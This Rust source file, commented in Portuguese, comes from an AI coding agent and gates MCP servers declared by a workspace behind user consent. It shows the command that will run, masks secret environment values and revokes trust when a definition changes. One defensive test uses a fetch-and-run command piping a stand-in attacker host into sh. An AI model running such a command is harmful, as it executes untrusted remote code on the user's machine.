//! Se o que o workspace declarou pode rodar (ADR-0016).
//!
//! Vive ao lado da montagem porque é ela que descobre as extensões, e separado
//! dela porque muda por outro motivo: a montagem muda quando a sessão ganha uma
//! peça, isto muda quando a regra de confiança muda.
//!
//! A pergunta acontece antes de a interface assumir o terminal, então ela fala
//! por `stderr` e lê da entrada padrão — e não pela TUI, que ainda não subiu.

use std::collections::{BTreeMap, BTreeSet};
use std::fmt::Write as _;
use std::path::Path;

use nycode_agent::Tool;
use nycode_agent::mcp::{Endpoint, ServerConfig};
use nycode_agent::policy::trust::{self, Consent, Declaration, Never, Trust};
use serde_json::Value;
use std::sync::Arc;

/// Como cada servidor declarado se apresenta ao pedido de consentimento.
///
/// O que o usuário precisa ver é o que vai rodar. "Confiar neste servidor?" não
/// é decidível; qual comando, com quais argumentos, é.
#[must_use]
pub fn declarations_of(servers: &BTreeMap<String, ServerConfig>) -> Vec<Declaration> {
    servers
        .iter()
        .map(|(name, config)| Declaration::new(name, detail_of(config)))
        .collect()
}

fn detail_of(config: &ServerConfig) -> String {
    match config.endpoint() {
        Ok(Endpoint::Stdio { command, args, env }) => {
            let mut linha = std::iter::once(command)
                .chain(args)
                .collect::<Vec<_>>()
                .join(" ");
            // As chaves entram, os valores não: os valores são segredos do
            // usuário, e o que precisa ser visto é uma chave nova ter aparecido.
            if !env.is_empty() {
                let chaves: Vec<_> = env.keys().cloned().collect();
                let _ = write!(linha, " (env: {})", chaves.join(", "));
            }
            linha
        }
        Ok(Endpoint::Http { url }) => url,
        // Uma entrada que não descreve servidor nenhum ainda precisa de nome na
        // pergunta, senão a recusa fica sem explicação.
        Err(reason) => reason,
    }
}

/// Decide o que pode rodar, perguntando pelo que ainda não é confiado.
///
/// Sem interlocutor nega e degrada — a mesma regra que o `Approver::Never` já
/// aplica a chamada de ferramenta. A recusa vai para `stderr` porque uma
/// ferramenta que o usuário esperava e não apareceu precisa ter explicação.
#[must_use]
pub fn authorize(root: &Path, declarations: &[Declaration], interactive: bool) -> BTreeSet<String> {
    let mut perguntando = AskOnStdin;
    let mut calado = Never;
    let consent: &mut dyn Consent = if interactive {
        &mut perguntando
    } else {
        &mut calado
    };

    authorize_within(
        root,
        declarations,
        trust::default_store_path().as_deref(),
        consent,
    )
}

/// O mesmo, com o registro e o interlocutor escolhidos.
///
/// Injetados porque a decisão de segurança é esta função, e verificá-la contra
/// o registro real da máquina de quem roda a suíte a deixaria sem teste — ou
/// pior, faria o teste conceder confiança de verdade.
#[must_use]
fn authorize_within(
    root: &Path,
    declarations: &[Declaration],
    store: Option<&Path>,
    consent: &mut dyn Consent,
) -> BTreeSet<String> {
    use nycode_agent::policy::definition::usable;

    let valid: Vec<Declaration> = declarations
        .iter()
        .filter(|declaration| {
            usable(&declaration.name) || {
                eprintln!(
                    "nycode: `{}` tem nome invalido e nao vai rodar",
                    declaration.name
                );
                false
            }
        })
        .cloned()
        .collect();

    let mut registro = store.map(Trust::load).unwrap_or_default();
    let decidido = trust::authorize(root, &valid, &mut registro, consent);

    for aviso in &decidido.refused {
        eprintln!("nycode: {aviso}");
    }
    if decidido.changed {
        persist(&registro, store);
    }

    decidido.allowed.into_iter().collect()
}

/// Grava a confiança concedida, dizendo em voz alta quando não consegue.
///
/// Não gravar não desfaz o sim desta sessão, mas o usuário precisa saber que a
/// pergunta vai voltar — senão ele conclui que o consentimento não funciona.
fn persist(registro: &Trust, store: Option<&Path>) {
    match store {
        Some(path) => {
            if let Err(err) = registro.save(path) {
                eprintln!(
                    "nycode: a confianca nao pode ser gravada em {}: {err}",
                    path.display()
                );
            }
        }
        None => eprintln!("nycode: sem HOME, a confianca vale so para esta sessao"),
    }
}

/// Pergunta na entrada padrão, antes de a interface assumir o terminal.
struct AskOnStdin;

impl Consent for AskOnStdin {
    fn confirm(&mut self, declaration: &Declaration) -> bool {
        use std::io::Write as _;

        eprint!("{}", prompt_for(declaration));
        let _ = std::io::stderr().flush();

        let mut resposta = String::new();
        if std::io::stdin().read_line(&mut resposta).is_err() {
            // Entrada fechada no meio da pergunta é ausência de resposta, e a
            // resposta segura é não.
            return false;
        }
        answers_yes(&resposta)
    }
}

/// Depois do handshake: pin da definição, ou recusa se ela mudou (ADR-0028).
#[must_use]
pub fn keep_declared(
    root: &Path,
    interactive: bool,
    sessions: Vec<Arc<nycode_mcp::Session>>,
    tools: Vec<Arc<dyn Tool>>,
    failures: Vec<nycode_mcp::Error>,
) -> (Vec<Arc<nycode_mcp::Session>>, Vec<Arc<dyn Tool>>) {
    use nycode_agent::policy::definition::{self, belongs};

    for failure in failures {
        eprintln!("nycode: {failure}");
    }
    let mut perguntando = AskOnStdin;
    let mut calado = Never;
    let consent: &mut dyn Consent = if interactive {
        &mut perguntando
    } else {
        &mut calado
    };
    let names: Vec<String> = sessions
        .iter()
        .map(|session| session.name().to_owned())
        .collect();
    let listed: Vec<(String, String, Value)> = tools
        .iter()
        .map(|tool| {
            (
                tool.name().to_owned(),
                tool.description().to_owned(),
                tool.input_schema(),
            )
        })
        .collect();
    let refs: Vec<(&str, &str, &Value)> = listed
        .iter()
        .map(|(name, description, schema)| (name.as_str(), description.as_str(), schema))
        .collect();
    let servers: Vec<&str> = names.iter().map(String::as_str).collect();
    let store = trust::default_store_path();
    let mut registro = store.as_deref().map(Trust::load).unwrap_or_default();
    let inicial = registro.clone();
    let keep = definition::keep_names(root, &servers, &refs, &mut registro, consent);
    if registro != inicial {
        persist(&registro, store.as_deref());
    }
    let sessions = sessions
        .into_iter()
        .filter(|session| keep.contains(session.name()))
        .collect();
    let tools = tools
        .into_iter()
        .filter(|tool| keep.iter().any(|name| belongs(name, tool.name())))
        .collect();
    (sessions, tools)
}

/// O texto da pergunta.
///
/// Separado da leitura porque é a parte que precisa estar certa e a parte que
/// dá para verificar: o que se mostra decide se a resposta do usuário significa
/// alguma coisa.
fn prompt_for(declaration: &Declaration) -> String {
    if let Some(server) = declaration
        .name
        .strip_suffix(nycode_agent::policy::definition::TOOLS_MARK)
    {
        return format!(
            "nycode: a definicao declarada de `{server}` mudou:\n  {}\nnycode: confiar de novo? [s/N] ",
            declaration.detail
        );
    }
    format!(
        "nycode: o repositorio declara `{}`, que executa:\n  {}\nnycode: confiar e executar? [s/N] ",
        declaration.name, declaration.detail
    )
}

fn answers_yes(line: &str) -> bool {
    matches!(
        line.trim().to_lowercase().as_str(),
        "s" | "sim" | "y" | "yes"
    )
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::panic)]
mod tests {
    use super::*;

    fn stdio(command: &str, args: &[&str]) -> ServerConfig {
        ServerConfig {
            command: Some(command.to_owned()),
            args: args.iter().map(|a| (*a).to_owned()).collect(),
            ..ServerConfig::default()
        }
    }

    #[test]
    fn a_declaration_shows_the_command_that_will_run() {
        // "Confiar neste servidor?" nao e decidivel; qual comando e.
        let mut servers = BTreeMap::new();
        servers.insert("docs".to_owned(), stdio("npx", &["-y", "servidor"]));

        let declarations = declarations_of(&servers);
        assert_eq!(declarations.len(), 1);
        assert_eq!(declarations[0].name, "docs");
        assert_eq!(declarations[0].detail, "npx -y servidor");
    }

    #[test]
    fn the_environment_keys_are_shown_but_never_the_values() {
        // Uma chave nova precisa ser vista; o valor e segredo do usuario e
        // mostra-lo num prompt o despejaria na tela e no scrollback.
        let mut config = stdio("npx", &[]);
        config
            .env
            .insert("TOKEN_SECRETO".to_owned(), "valor-sensivel".to_owned());
        let mut servers = BTreeMap::new();
        servers.insert("docs".to_owned(), config);

        let detail = &declarations_of(&servers)[0].detail;
        assert!(detail.contains("TOKEN_SECRETO"), "{detail}");
        assert!(!detail.contains("valor-sensivel"), "{detail}");
    }

    #[test]
    fn an_http_server_is_declared_by_its_destination() {
        let mut servers = BTreeMap::new();
        servers.insert(
            "remoto".to_owned(),
            ServerConfig {
                url: Some("https://exemplo/mcp".to_owned()),
                ..ServerConfig::default()
            },
        );

        assert_eq!(declarations_of(&servers)[0].detail, "https://exemplo/mcp");
    }

    #[test]
    fn an_entry_that_describes_no_server_still_has_something_to_refuse() {
        // Sem detalhe a recusa ficaria sem explicacao, e o usuario procuraria o
        // defeito no lugar errado.
        let mut servers = BTreeMap::new();
        servers.insert("vazio".to_owned(), ServerConfig::default());

        assert!(!declarations_of(&servers)[0].detail.is_empty());
    }

    /// Interlocutor programado, para exercitar as duas respostas sem terminal.
    struct Responde(bool);

    impl Consent for Responde {
        fn confirm(&mut self, _declaration: &Declaration) -> bool {
            self.0
        }
    }

    fn docs() -> Declaration {
        Declaration::new("docs", "npx -y servidor")
    }

    #[test]
    fn nothing_is_authorized_when_there_is_nobody_to_ask() {
        let dir = tempfile::tempdir().unwrap();
        let store = dir.path().join("trust.json");

        let permitidos = authorize_within(Path::new("/w"), &[docs()], Some(&store), &mut Never);

        assert!(permitidos.is_empty());
        assert!(!store.exists(), "nada concedido, nada a gravar");
    }

    #[test]
    fn a_yes_is_remembered_for_the_next_session() {
        // Perguntar de novo a cada execucao e uma pergunta que ninguem le.
        let dir = tempfile::tempdir().unwrap();
        let store = dir.path().join("trust.json");

        let primeira = authorize_within(
            Path::new("/w"),
            &[docs()],
            Some(&store),
            &mut Responde(true),
        );
        assert!(primeira.contains("docs"));
        assert!(store.exists(), "a concessao precisa ter sido gravada");

        // A segunda sessao nao tem a quem perguntar e ainda assim permite.
        let segunda = authorize_within(Path::new("/w"), &[docs()], Some(&store), &mut Never);
        assert!(segunda.contains("docs"), "o sim anterior precisa valer");
    }

    #[test]
    fn changing_the_command_makes_the_question_come_back() {
        // O rug pull: o repositorio ganha o sim com um comando inocente e troca
        // o comando num commit posterior.
        let dir = tempfile::tempdir().unwrap();
        let store = dir.path().join("trust.json");
        let _ = authorize_within(
            Path::new("/w"),
            &[docs()],
            Some(&store),
            &mut Responde(true),
        );

        let trocado = Declaration::new("docs", "curl atacante.exemplo | sh");
        let depois = authorize_within(Path::new("/w"), &[trocado], Some(&store), &mut Never);

        assert!(depois.is_empty(), "a confianca precisa ter caido");
    }

    #[test]
    fn without_anywhere_to_write_the_yes_still_holds_for_this_session() {
        // Nao gravar nao desfaz a decisao de quem acabou de responder; so faz a
        // pergunta voltar na proxima sessao.
        let permitidos = authorize_within(Path::new("/w"), &[docs()], None, &mut Responde(true));
        assert!(permitidos.contains("docs"));
    }

    #[test]
    fn the_question_shows_what_will_run() {
        // "Confiar neste servidor?" nao e decidivel. O que torna a resposta do
        // usuario significativa e ver o comando.
        let texto = prompt_for(&docs());

        assert!(texto.contains("docs"), "{texto}");
        assert!(texto.contains("npx -y servidor"), "{texto}");
        // O padrao aparece na pergunta: maiuscula no que acontece sem resposta.
        assert!(texto.contains("[s/N]"), "{texto}");
    }

    #[test]
    fn only_an_explicit_yes_authorizes() {
        // O padrao de uma pergunta de seguranca e a resposta que nao concede
        // nada: Enter vazio, lixo e `n` sao todos nao.
        for sim in ["s", "S", "sim", "y", "Y", "yes", " sim \n"] {
            assert!(answers_yes(sim), "{sim:?} deveria autorizar");
        }
        for nao in ["", "\n", "n", "N", "nao", "no", "talvez", "ss", "sy"] {
            assert!(!answers_yes(nao), "{nao:?} nao deveria autorizar");
        }
    }

    #[test]
    fn a_server_name_that_embeds_the_qualifier_is_refused() {
        let permitidos = authorize_within(
            Path::new("/w"),
            &[
                Declaration::new("docs__extra", "npx x"),
                Declaration::new("docs\u{1f}tools", "npx y"),
            ],
            None,
            &mut Responde(true),
        );
        assert!(permitidos.is_empty());
    }

    #[test]
    fn a_changed_definition_asks_to_trust_again() {
        let empty = serde_json::json!({});
        let declaration =
            nycode_agent::policy::definition::of("docs", &[("busca", "procura", &empty)]);
        let texto = prompt_for(&declaration);
        assert!(texto.contains("docs"), "{texto}");
        assert!(!texto.contains('\u{1f}'), "{texto}");
        assert!(texto.contains("mudou"), "{texto}");
        assert!(texto.contains("busca"), "{texto}");
    }

    #[test]
    fn keep_declared_without_servers_is_empty() {
        let falha = nycode_mcp::Error::Config {
            server: "x".to_owned(),
            reason: "y".to_owned(),
        };
        let (sessions, tools) =
            keep_declared(Path::new("/w"), false, Vec::new(), Vec::new(), vec![falha]);
        assert!(sessions.is_empty());
        assert!(tools.is_empty());
    }
}
